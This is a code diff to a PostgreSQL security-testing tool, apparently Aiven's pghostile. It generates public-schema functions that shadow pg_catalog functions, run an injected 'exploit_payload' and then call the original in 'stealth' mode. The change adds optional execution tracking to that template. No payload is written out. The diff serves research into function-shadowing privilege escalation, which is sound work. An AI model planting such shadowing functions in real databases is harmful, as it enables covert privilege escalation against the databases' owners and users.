@@ -1,10 +1,10 @@
 # Copyright (c) 2022 Aiven, Helsinki, Finland. https://aiven.io
-
+import json
 from core.utils import convert_rettype, pgtype_get_names_map, get_test_value_for_type
 
 
 class DBFunction:
-    def __init__(self, name, params_type, initial_params_type, initial_rettype, exploit_payload, stealth_mode=True):
+    def __init__(self, name, params_type, initial_params_type, initial_rettype, exploit_payload, stealth_mode=True, track_execution=False):
         self.name = name
         self.params_type = params_type
         self.initial_params_type = initial_params_type
@@ -40,7 +40,7 @@ class DBFunction:
                 create function public.{self.name}({inargs})
                 returns {pg_type_names[self.rettype]} as
                 $$
-                    %s
+                    %s%s
                     select pg_catalog.{self.name}({callargs});
                 $$
                 language sql;
@@ -50,14 +50,21 @@ class DBFunction:
                 create function public.{self.name}({inargs})
                 returns integer as
                 $$
-                    %s
+                    %s%s
                     select 1;
                 $$
                 language sql;
             """
 
-        self.create_query_test = base_qry % "create function public.___test_wrapper() returns integer as 'select 1' language sql;"
-        self.create_query_exploit = base_qry % self.exploit_payload
+        if track_execution:
+            tracker = """
+                insert into pghostile.triggers (fname, params, current_query) values ('%s', '%s', current_query());
+            """ % (self.name, json.dumps(params_names))
+        else:
+            tracker = ""
+
+        self.create_query_test = base_qry % ("", "create function public.___test_wrapper() returns integer as 'select 1' language sql;")
+        self.create_query_exploit = base_qry % (tracker, self.exploit_payload)
 
     def __str__(self):
         return "%s %s" % (self.name, ", ".join([str(i) for i in self.params_type]))
